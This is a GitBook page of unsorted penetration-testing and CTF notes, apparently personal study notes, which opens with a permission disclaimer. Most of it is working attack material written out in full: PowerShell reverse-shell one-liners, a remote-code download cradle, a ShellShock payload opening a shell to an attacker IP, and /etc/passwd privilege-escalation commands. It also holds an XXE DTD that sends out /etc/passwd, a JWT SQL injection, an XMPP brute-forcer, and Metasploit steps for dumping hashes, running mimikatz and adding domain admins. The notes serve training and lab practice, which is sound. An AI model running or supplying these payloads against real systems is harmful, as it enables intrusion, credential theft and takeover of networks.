---
description: >-
  Misc notes that still need to be sorted through and sent to their proper
  homes.
---

# Unsorted

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

## Markdown

```
{% raw %}
{% hint style="warning" %} Text between these will show up in a Warning box. Looks nice! {% endhint %}
{% endraw %}
```

{% hint style="danger" %}
Text between these will show up in a Warning box. Looks nice!

_Can click on the icon to change it to something appropriate ( Changes style, I think. Gitbook only?)._
{% endhint %}

## -----

[https://8gwifi.org/PemParserFunctions.jsp](https://8gwifi.org/PemParserFunctions.jsp) <--extract information from various digital certificates

## SSH Keys

`` ` extract public key from private key: ``openssl rsa -in privkey.pem -pubout -out key.pub\`

## -----

Firefox Browser plugins:Tampermonkey (userscript manager); Cookie Manager+;

## HEX

view hex of file only: `xxd -p`

reverse from hex: `xxd -r -p > <filename>`

## msfvenom

custom exploit making:\[Ippsec:HacktheBox - Granny & Grandpa]

```bash
msfvenom -p <payload> LHOST=<lhost> etc... -f <filetype [use --help-formats first]>
```

## -----

injecting IPs when '.' is disallowed: convert dotted\_decimal to decimal value -[ip2dh](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)

## -----

[AndroidAssetStudio](https://romannurik.github.io/AndroidAssetStudio/index.html)

## Port knocking

[Ippsec:HackTheBox - Nineveh](https://www.youtube.com/watch?v=K9DKULxSBK4)

iptables knockd:

```bash
for i in <port> <port> <port>; do nmap -Pn -p $i --host_timeout 201 --max_retries 0 <ip>; done
```

## -----

recursively download all files in hosted folder: `wget -r <ip:port>`

## -----

[Hurricane Electric ISP](http://he.net/): Ippsec uses with IPv6 as a psuedo-VPN in [HTB:Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

## IPv6

primer: [Ippsec:HacktheBox - Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

```
fe80::/10 - febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Link Local 169.254.x.x APIPA 
(built from MAC address on Linux, 7th bit flips, adds ff:fe in the center)

fc00::/7 - fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Local Unicast 10.x.x.x, 172.16.x.x, 192.168.x.x 

2000::/3 - Global Unicast routable 

ff02::1 - Multicast All Nodes 

ff02::2 Multicast ROUTER nodes
```

ip6tables - iptables for ipv6

## -----

`ls /usr/share/nmap/scripts/ |grep smb` - find nmap scripts related to smb, search this folder for any scripts for a service you want to enumerate

## -----

Cisco Smart Install Client Service Available -Then, we can pull the configs with SIET: `siet.py -i 10.10.10.10 -g` SIET: [https://github.com/Sab0tag3d/SIET/](https://github.com/Sab0tag3d/SIET/)

## pass the hash

responder.py - or - write .lnk files to writeable shares that point back to attacker - capture hashes and relay attacks enable smb signing and limit llmnr (group policy) respounder - detect responder - responder guard

`crackmapexec smb ip -u <name> -H <hash> --lsa` - pass the hash; drsuapi - search in wireshark to detect - win long id 4624 user\_reported\_sid: S-1-0-0 logon\_process\_name:ntlmssp

Defense:[https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win\_pass\_the\_hash.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win\_pass\_the\_hash.yml); In our lab environment, we could consistently catch the pass-the-hash attacks by monitoring event\_id : 4624, with logon types of ntlmssp, and the security SID at S-1-0-0 (NULL / NOBODY). You too can instrument this attack!

## -----

Plumhound -

## -----

Bad blood - create domain for your (defense tool, or lab setup) fills AD with objects, don't use in production! (cant create sessions)

## Winpeas

#### Windows icacls file permissions

[https://ss64.com/nt/icacls.html](https://ss64.com/nt/icacls.html) Interesting permissions

D - Delete access F - Full access (Edit\_Permissions+Create+Delete+Read+Write) N - No access M - Modify access (Create+Delete+Read+Write) RX - Read and eXecute access R - Read-only access W - Write-only access

winpeas.exe cmd searchall searchfast #cmd commands, search all filenames and avoid sleeping (noisy - CTFs)

winpeas.exe #Will execute all checks except the ones that use a CMD

winpeas.exe cmd #All checks

winpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed

winpeas.exe notcolor #Do not color the output

winpeas.exe cmd wait #cmd commands and wait between tests

In Linux the ouput will be colored using ANSI colors. If you are executing winpeas.exe from a Windows console, you need to set a registry value to see the colors (and open a new CMD): `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

### -----

[https://github.com/wpscanteam/wpscan/issues/190#issuecomment-18087644](https://github.com/wpscanteam/wpscan/issues/190#issuecomment-18087644) `iconv -f ISO-8859-1 -t UTF-8 /pentest/passwords/wordlists/rockyou.txt > rockyou_utf8.txt`

Some programs have issues with rockyou.txt because the file is in the wrong encoding by default.  USe the above to convert it to utf8 so it works with these programs.

### -----

[https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### -----

[https://vulndev.io/notes/2019/01/01/windows.html](https://vulndev.io/notes/2019/01/01/windows.html)

### -----

compress files using windows, sets "Compressed" attribute (cmd.exe) `compact /C /S c:\MyDirectory`

### -----

[http://w3af.org/](http://w3af.org/) web application scanner

### -----

[https://base64.guru/converter/decode/file](https://base64.guru/converter/decode/file) recover files sent in base64 (very useful for recovering files sent in emails)

### -----

wfuzz -c -z range,1-65535 --hl=2 [http://10.10.10.55:60000/url.php?path=localhost:FUZZ](http://10.10.10.55:60000/url.php?path=localhost:FUZZ)

burp intruder alternative for brute-forcing ports (or any number range)

### -----

## Faster filtering with the silver searcher

[https://github.com/ggreer/the\_silver\_searcher](https://github.com/ggreer/the\_silver\_searcher)

For faster searching, use all the above grep regular expressions with the command `ag`.

### -----

take the name of each file in a directory and try to connect to a site with that filename. (searching for web shells in Traceback- HTB)

```
for file in $(cat /home/zweilos/htb/traceback/webshells); do echo $file && curl -I http://10.10.10.181/$file; done
```

### -----

## Misc Notes

### Useful x86 Msfvenom Encoders

```
x86/shikata_ga_nai
x86/fnstenv_mov
```

### TMUX Hijacking

```
tmux -S *session path* 
Example: tmux -S /.devs/dev_sess
```

### Hidden Windows Text Stream

Find:

```
dir /R
```

Read:

```
more < hm.txt:root.txt:$DATA
```

### DirtyCOW Exploit (Linux Kernel version from 2.6.22 to 3.9)

[https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)

### Oracle Enumeration TNS Listener (port 1521)

[https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)

```
Also check HackTheBox Silo writeup for more references
```

### Buffer Overflow Bad Chars

```
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

### JS Meterpreter Payload

```
msfvenom -p <payload > LHOST=<ip> LPORT=<port> -f js_le -e generic/none
```

### Compile on Linux for Windows x86

```
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

### From MSSQL Injection to RCE

[https://www.tarlogic.com/en/blog/red-team-tales-0x01/](https://www.tarlogic.com/en/blog/red-team-tales-0x01/)

### Windows Kernel Vulnerabilities Finder - Sherlock (PowerShell)

```
https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

### PowerShell one-liners (incl. file transfers)

```
https://www.puckiestyle.nl/
```

### Much Better PowerShell Reverse Shell One-Liner

```
powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='IP';$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```

### Post-Exploitation Enumerate all users of Domain

```
net user /Domain
```

### Windows XP SP0/SP1 Privilege Escalation:

```
https://sohvaxus.github.io/content/winxp-sp1-privesc.html
```

### SUID Flag on /usr/bin/cp command Privilege Escalation

```
1. echo "bob:\$1\$-itnite\$VRvGqpGVibx/r9NPdLLTF1:0:0:root:/root:/bin/bash" >> /tmp/passwd
2. /usr/bin/cp /tmp/passwd /etc/passwd
3. su - bob (Password: bob)
```

### Writable /etc/passwd Privilege Escalation

```
echo root::0:0:root:/root:/bin/bash > /etc/passwd

su
```

### Bypass robots.txt "You are not a search engine. Permission denied."

```
Set User-Agent to "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
```

### ShellShock PHP < 5.6.2

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTOM/cgi-bin/admin.cgi
```

### Privilege Escalation through SeImpersonatePrivilege permission (JuicyPotato)

[https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) [https://www.absolomb.com/2018-05-04-HackTheBox-Tally/](https://www.absolomb.com/2018-05-04-HackTheBox-Tally/)

### Memcached Pentest & Enumeration

[https://www.hackingarticles.in/penetration-testing-on-memcached-server/](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)

### Tunneling Post-Exploitation (PortForwarding) through Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

### Tunelling on Windows

```
Using plink.exe within PuTTY project folder
```

### Windows Service Start Mode Enumeration

invalid query?

```
wmic service where caption="SERVICE" get startmode
```

### Windows check permissions over a file/executable with 'icacls'

```
icacls "C\full_path\file.exe"
```

Permissions: F - full access M - modify access RX - read & execute access R - read access W - write-only access

### Client-Side .hta (HTML-based Internet Explorer only) Code Execution

```markup
<html>
    <body>
        <script>
            var c= 'cmd.exe'
            new ActiveXObject('WScript.Shell').Run(c);
        </script>
    </body>
</html>
```

### Fingerprinting Client-Side Victim

[https://github.com/fingerprintjs/fingerprintjs2](https://github.com/fingerprintjs/fingerprintjs2)

### Scan Security Headers

[https://securityheaders.com/](https://securityheaders.com/)

### PowerShell to retrieve Active Directory objects (including deleted)

`Get-ADObject`

### mysql command line alternative

```bash
mysqldump
```

### TTY Shell that works almost every time on Linux

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Kerberos check for valid usernames or bruteforce user/pass with kerbrute

[https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)

### TeamViewer Privilege Escalation -> CVE-2019-189888

```
meterpreter &gt; run post/windows/gather/credentials/teamviewer\_passwords
```

### PowerShell Reverse Shell

```
$client = New-Object System.Net.Sockets.TCPClient\('192.168.0.0',4444\);$stream = $client.GetStream\(\);\[byte\[\]\]$bytes = 0..65535\|%{0};while\(\($i = $stream.Read\($bytes, 0, $bytes.Length\)\) -ne 0\){;$data = \(New-Object -TypeName System.Text.ASCIIEncoding\).GetString\($bytes,0, $i\);$sendback = \(iex $data 2&gt;&1 \| Out-String \);$sendback2 = $sendback + 'PS ' + \(pwd\).Path + '&gt; ';$sendbyte = \(\[text.encoding\]::ASCII\).GetBytes\($sendback2\);$stream.Write\($sendbyte,0,$sendbyte.Length\);$stream.Flush\(\)};$client.Close\(\)

$sm=\(New-Object Net.Sockets.TCPClient\('192.168.0.0',4444\)\).GetStream\(\);\[byte\[\]\]$bt=0..65535\|%{0};while\(\($i=$sm.Read\($bt,0,$bt.Length\)\) -ne 0\){;$d=\(New-Object Text.ASCIIEncoding\).GetString\($bt,0,$i\);$st=\(\[text.encoding\]::ASCII\).GetBytes\(\(iex $d 2&gt;&1\)\);$sm.Write\($st,0,$st.Length\)}
```

Pull the shell:

```
powershell.exe -c "IEX \(New-Object Net.WebClient\).DownloadString\('SHELL URL'\)"
```

### CVE-2019-10-15 Sudo < 1.2.28 Privilege Escalation

```
sudo -u#-1 /bin/bash
```

### Adminer Database Management Tool Exploit Bypass Login

[https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

### Alternate data streams of empty or incomplete file on SMB

`allinfo *file*`

### SMB Recursively List Files

`recurse on` \
&#x20;`ls`

### Telnet > Netcat

When connecting to a service, where possible, choose TELNET over Netcat

### /etc/update-motd.d Privilege Escalation

[https://blog.haao.sh/writeups/fowsniff-writeup/](https://blog.haao.sh/writeups/fowsniff-writeup/)

### Really Good Privilege Escalation Scripts

[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

### XMPP Authentication Crack

```python
import base64
import hashlib
import hmac
import itertools

charset = "_abcdefghijklmnopqrstuvwxyz"

initial_message = "n=,r="
server_first_message = "r=,s=,i="
server_final_message_compare = "v="
r = server_first_message[2:server_first_message.find('s=')-1]
s = server_first_message[server_first_message.find('s=')+2:server_first_message.find('i=')-1]
i = server_first_message[server_first_message.find('i=')+2:]

for passlen in range(1,3):
    print "test passlen %d" % passlen
    for k in itertools.permutations(charset, passlen):
        password = "koma" + "".join(k)
        salt = base64.b64decode(s)
        client_final_message_bare = 'c=biws,r=' + r
        salt_password = hashlib.pbkdf2_hmac('sha1', password, salt, int(i))
        auth_message = initial_message + ',' + server_first_message + ',' + client_final_message_bare
        server_key = hmac.new(salt_password, 'Server Key', hashlib.sha1).digest()
        server_signature = hmac.new(server_key, auth_message, hashlib.sha1).digest()
        server_final_message = 'v=' + base64.b64encode(server_signature)
        if server_final_message == server_final_message_compare:
            print "found the result"
            print password
            h = hashlib.new('sha1')
            h.update(password)
            print h.hexdigest()
            exit(-1)
```

### CTF Docs

[https://github.com/welchbj/ctf/tree/master/docs](https://github.com/welchbj/ctf/tree/master/docs)

### Test for LDAP NULL BIND

```bash
ldapsearch -H ldap://host:port -x -s base '' "(objectClass=*)" "*" +
```

### Extract VBA Script from document

[https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php](https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php)

### Decode Rubber Ducky USB .bin payloads

[https://ducktoolkit.com/decode#](https://ducktoolkit.com/decode)

### Crack Android lockscreen from system files (gesture.key)

[https://github.com/KieronCraggs/GestureCrack](https://github.com/KieronCraggs/GestureCrack)

### XOR Analysis

[https://github.com/hellman/xortool](https://github.com/hellman/xortool)

### Cryptanalysis

[https://github.com/nccgroup/featherduster](https://github.com/nccgroup/featherduster)

### RSA Cracking Tools

* [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
* [https://github.com/ius/rsatool](https://github.com/ius/rsatool)

### Morse Code Audio Decode

[https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

### Text to 21 Common Ciphers

[https://v2.cryptii.com/text/select](https://v2.cryptii.com/text/select)

### Crypto Example Challenges

[https://asecuritysite.com/encryption/ctf?mybutton=](https://asecuritysite.com/encryption/ctf?mybutton=)

### Shift in Python (crypto)

```python
with open('FILENAME') as f:
    msg = f.read()
    for x in range(256):
        print ''.join([chr((ord(y) + x) % 256) for y in msg])
```

### Predict encoding/crypto type

[https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false](https://gchq.github.io/CyberChef/#recipe=Magic\(3,false,false),'')

### Get data, process and respond over a socket

```python
import socket
import re

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(('IP', PORT))
data = clientsocket.recv(1024)
print data
result = re.sub('[^0-9]', '', data) #Retrieve the digits (or numbers) only from input
print result
clientsocket.send(str(result))
data = clientsocket.recv(1024)
print data
```

### Extract domain names & hosts from PCAP

_Domain Names_

```bash
tshark -r *PCAP* -Y 'dns' -T fields -e dns.qry.name | sort -u > dns.txt
```

_Hosts_

```bash
tshark -r *PCAP* -Y 'tls.handshake.extensions_server_name' -T fields -e tls.handshake.extensions_server_name | sort -u > hosts.txt
```

### Useful PCAP Reader

```bash
chaosreader
```

### ZIP Format File Signatures

_HEADER_

```
50 4B 03 04 14
```

_FOOTER_

```
50 4B 05 06 00
```

### JWT KID Value Exploitation

_Sign with public file from server_

```
kid: public/css/file.css

wget file.css from target

manipulate token using jwt_tool and sign it with file.css
```

_SQL Injection_

```
kid: test' UNION SELECT 'key';--

manipulate token using jwt_tool and sign it using the secret -> 'key'
```

### Blind XXE to SSRF

_ON TARGET_

```markup
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "*HOST ADDRESS OF DTD FILE (preferably on github)*">
<foo>&e1;</foo>
`
```

_INSIDE DTD FILE_

```markup
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM '*RANDOM HTTP HOST (like https://requestbin.com/)*/%p1;'>">
%p2;
```

[https://github.com/corneacristian/Notes](https://github.com/corneacristian/Notes)

Enumerate Users via Finger


`finger $user@$IP`

Show nfs shares available


`showmount -e $IP`

Use nfspysh to mount share and create .ssh directory


nfspysh -o server=192.168.0.20:/home/user

mkdir .ssh

cd .ssh

Transfer attacker public key to host&#x20;with FTP
--------------

put /tmp/authorized\_keys

exit

Login to SSH server with no password


SSH\_AUTH\_SOCK=0 ssh user@192.168.0.20

## Bash Basics

\[+] nano Shortcuts

```markup
ctrl v			Next page.
ctrl y			Previous page.
ctrl w			Where is (find).
ctrl k			Cut that line of test.
ctrl x     	Exit editor.
```

\[+] Create a text file:

```markup
touch file		Creates an empty file.
ifconfig > tmp	pipe the output of a command
nano file
```

\[+] Create a file and append text to it:

```markup
ifconfig > tmp     
echo >> tmp
ping google.com -c3 >> tmp
```

\[+] How to view a file:

```markup
cat file		    Show entire contents of file.
more file		    Show one page at a time.  Space bar for next page and (q) to exit.
head file		    Show the first 10 lines.
head -15 file   Show the first 15 lines.
tail file		    Show the last 10 lines.
tail -15 file	  Show the last 15 lines.
tail -f file	  Useful when viewing the output of a log file.
```

\[+] Word Count

```markup
wc -l tmp2		Count the number of lines in a file
```

\[+] sort

```markup
sort -u file                                        Sort by unique		
sort -t . -k 1,1n -k 2,2n -k 3,3n -k 4,4n            Sort IP addresses correctly
cat tmp2 | cut -d '(' -f2 | cut -d ')' -f1 | sort -u		Isolate the IP address
```

\[+] awk

```markup
awk '{print $1}' file 		Show the 1st column.
awk '{print $1,$5}' file 	Show the 1st and 5th columns.
```

\[+] egrep -v

```markup
Remove multiple strings	egrep -v '(red|white|blue)' file
```

\[+] sed

```markup
sed 's/FOO/BAR/g' file 		Replace FOO with BAR.
sed 's/FOO//g' file 		Replace FOO with nothing.
sed '/^FOO/d' file 			Remove lines that start with FOO.
```



\[+] colors

```markup
31=red 32=green 33=yellow 34=blue 35=magenta 36=cyan 
echo -e "\e[1;34mThis is a blue text.\e[0m"
```

\[+] Make a file executable.

```markup
chmod +x file
chmod 755 file
```

\[+] Reminders

```
LOG EVERYTHING!

Metasploit - spool /home/<username>/console.log
Linux Terminal - script /home/<username>/Engagements/TestOutput.txt  #Type exit to stop

Set IP address
ifconfig eth0 192.168.50.12/24

Set default gateway
route add default gw 192.168.50.9

Set DNS servers
echo "nameserver 192.168.100.2" >> /etc/resolv.conf

Show routing table
Windows - route print
Linux   - route -n

Add static route
Linux - route add -net 192.168.100.0/24 gw 192.16.50.9
Windows - route add 0.0.0.0 mask 0.0.0.0 192.168.50.9

Subnetting easy mode
ipcalc 192.168.0.1 255.255.255.0
```

```

[+] External Infrastructure Testing - Information Gathering

WHOIS Querying
whois www.domain.com

Resolve an IP using DIG
host www.google.com 8.8.8.8

Find Mail servers for a domain
host -t mx www.gmail.com 8.8.8.8

Find any DNS records for a domain
host -t any www.google.com 8.8.8.8

Zone Transfer
host -l securitymuppets.com 192.168.100.2

Metasploit Auxiliarys
auxiliary/gather/enum_dns

Fierce
fierce -dns <domain> -wordlist <wordlist>


[+] External Infrastructure Testing - VPN Testing

ike-scan
ike-scan 192.168.207.134
sudo ike-scan -A 192.168.207.134
sudo ike-scan -A 192.168.207.134 --id=myid -P192-168-207-134key

pskcrack
psk-crack -b 5 192-168-207-134key
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
psk-crack -d /path/to/dictionary 192-168-207-134key


[+] Internal Infrastructure Testing - Network Enumeration

DHCP Information - Use ipconfig /all to obtain useful information.

Network Sniffing (Wireshark, tshark, tcpdump)
Sniffing is a great passive method for mapping networks and systems. Typically, you’ll see a lot of broadcast traffic such as DNS, NBNS, BROWSER, and Cisco protocols that reveal hostnames, active subnets, VLANS, and domain names.

Net view
net view /ALL /Domain:clientdomain.com

ARP Scan
arp-scan 192.168.50.8/28 -I eth0

Nmap ping scan
sudo nmap –sn -oA nmap_pingscan 192.168.100.0/24

Nmap SYN/Top 100 ports Scan
nmap -sS -F -oA nmap_fastscan 192.168.0.1/24

Nmap all port version scan
sudo nmap -sTV -p0- -A --stats-every 10s --reason --min-rate 1000 -oA nmap_scan 192.168.0.1/24

Nmap UDP all port scan
sudo nmap -sU -p0- --reason --stats-every 60s --max-rtt-timeout=50ms --max-retries=1 -oA nmap_scan 192.168.0.1/24

Nmap source port scanning
nmap -g <port> (88 (Kerberos) port 53 (DNS) or 67 (DHCP))

Hping3 scanning
hping3 -c 3 -s 53 -p 80 -S 192.168.0.1
Open = flags = SA
Closed = Flags = RA
Blocked = ICMP unreachable
Dropped = No response


[+] Internal Infrastructure Testing - Windows Domain Enumeration

Obtain domain information using windows
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName

DNS Lookup
nslookup -type=SRV _ldap._tcp.

User/Domain enumeration using RDP
rdesktop 172.16.100.141 -u ""

Net Group Command
net group "Domain Controllers" /domain

Netbios enumeration
nbtscan -r 192.168.0.1-100
nbtscan -f hostfiles.txt

enum4linux

RID cycling
use auxiliary/scanner/smb/smb_lookupsid
ridenum

Net Users
net users /domain

Null session in windows
net use \\192.168.0.1\IPC$ "" /u:""

Null session in linux
smbclient -L //192.168.99.131

nbtscan
nbtscan -r 10.0.2.0/24

Sharepoint User Profile Page
Find SharePoint servers with nmap, Nessus etc.

Net Accounts - Obtain Password Policy
net accounts


[+] Internal Infrastructure Testing - Quick Domain Administrator Compromise

Compromise machine via missing Microsoft patch, weak credentials or credentials found via Responder.

From Shell - net group "Domain Admins" /domain

Dump the hashes (Metasploit)
msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE

Find the admins (Metasploit)
spool /tmp/enumdomainusers.txt
msf > use auxiliary/scanner/smb/smb_enumusers_domain
msf > set smbuser Administrator
msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf > set rhosts 10.10.10.0/24
msf > set threads 8
msf > run
msf> spool off

Compromise the administrator's machine
meterpreter > load mimikatz
meterpreter > wdigest

or

meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOM\\adaministrator
meterpreter > getuid
meterpreter > shell

C:\> whoami
mydom\adaministrator
C:\> net user hacker /add /domain
C:\> net group "Domain Admins" hacker /add /domain


[+] Internal Infrastructure Testing - Post Exploitation

Meterpreter
meterpreter> sysinfo
meterpreter> getuid
meterpreter> ipconfig
meterpreter> run post/windows/gather/checkvm
meterpreter> run get_local_subnets

Privilege Escalation (If Required)
run post/windows/escalate/getsystem
use post/windows/escalate/droplnk
use exploit/windows/local/bypassuac
use exploit/windows/local/service_permissions
use exploit/windows/local/trusted_service_path
use exploit/windows/local/ppr_flatten_rec
use exploit/windows/local/ms_ndproxy
use exploit/windows/local/ask

meterpreter> run getcountermeasure
meterpreter> run winenum
meterpreter> run post/windows/gather/smart_hashdump
meterpreter> run post/windows/gather/credentials/sso
meterpreter> run post/windows/gather/cachedump
meterpreter> run post/windows/gather/lsa_secrets
meterpreter> run post/windows/gather/smart_hashdump
meterpreter> run post/windows/gather/enum_ad_computers
meterpreter> run post/windows/gather/win_privs
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows/gather/enum_logged_on_users
meterpreter > run post/windows/gather/usb_history
meterpreter > run post/windows/gather/enum_shares
meterpreter > run post/windows/gather/enum_snmp

meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token TVM\domainadmin
meterpreter > add_user hacker password1 -h 192.168.0.10
meterpreter > add_group_user "Domain Admins" hacker -h 192.168.0.10

meterpreter > load mimikatz
meterpreter > wdigest

Dump remote SAM:
meterpreter> run post/windows/gather/smart_hashdump

python-impact
psexec.py
secretsdump.py

Kitrap0d
Download vdmallowed.exe and vdmexploit.dll to victim
Run vdmallowed.exe to execute system shell
Add Linux User
/usr/sbin/useradd –g 0 –u 0 –o user
echo user:password | /usr/sbin/chpasswd

Solaris Commands
useradd -o user
passwd user
usermod -R root user

RSERVICES
---------
rwho 192.168.0.1
rlogin -l root 192.168.0.17

RPC Services
------------
rpcinfo -p
Endpoint_mapper metasploit



```

## Windows Enumeration

```
Find Group Policy Preference XML files:
C:>findstr /S cpassword %logonserver%\sysvol\*.xml
meterpreter > post/windows/gather/credentials/gpp
```

## \[+] Pivoting - Lateral Movement

```
SSH Tunneling:
Remote forward port 222
ssh -R 127.0.0.1:4444:10.1.1.251:222 -p 443 root@192.168.10.118
meterpreter> run arp_scanner -r 10.10.10.0/24
route add 10.10.10.10 255.255.255.248 <session>
use auxiliary/scanner/portscan/tcp

autoroute:
meterpreter > ipconfig
meterpreter > run autoroute -s 10.1.13.0/24
meterpreter > getsystem
meterpreter > run hashdump
use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > use exploit/windows/smb/psexec 

port forwarding:
meterpreter > run autoroute -s 10.1.13.0/24
use auxiliary/scanner/portscan/tcp
meterpreter > portfwd add -l <listening port> -p <remote port> -r <remote/internal host>

socks proxy:
route add 10.10.10.10 255.255.255.248 <session>
use auxiliary/server/socks4a
Add proxy to /etc/proxychains.conf
proxychains nmap -sT -T4 -Pn 10.10.10.50
setg socks4:127.0.0.1:1080
```

## Finger - Enumerate Users

```
finger @192.168.0.1
finger -l -p user@ip-address
Metasploit - auxiliary/scanner/finger/finger_users
```

## SNMP

```
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt
Metasploit Module snmp_enum
snmpcheck -t snmpservice

```

## NFS

```
showmount -e 192.168.0.10
mount 192.168.0.10:/secret /mnt/share/
Metasploit - auxiliary/scanner/nfs/nfsmount
rpcinfo -p 192.168.0.10
```

## LDAP

```
Tools:
ldapsearch
LDAPExplorertool2

ldapsearch -h <ip> -p 389 -x -s base

Anonymous Bind:
ldapsearch -h ldaphostname -p 389 -x -b "dc=domain,dc=com"

Authenticated:
ldapsearch -h 192.168.0.60 -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>, DC=com" -b "DC=<domain>, DC=com" -W


```

## SMTP

```
ncat -C mail.host.com 25

EHLO hostname
MAIL FROM: test@host.com
RCPT TO:   www@host.com
DATA
From: A tester <test@host.com>
To:   <www@host.com>
Date: date
Subject: A test message from hostname

Click me, please http://10.10.10.10/
.
QUIT
```

## Useful Commands

```
[+] Remove text using sed
cat SSL_Hosts.txt | sed -r 's/\ttcp\t/:/g'

[+] Port forwarding using NCAT
ncat -lvkp 12345 -c "ncat --ssl 192.168.0.1 443"

[+] Windows 7 or later, build port relay
C:\> netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>

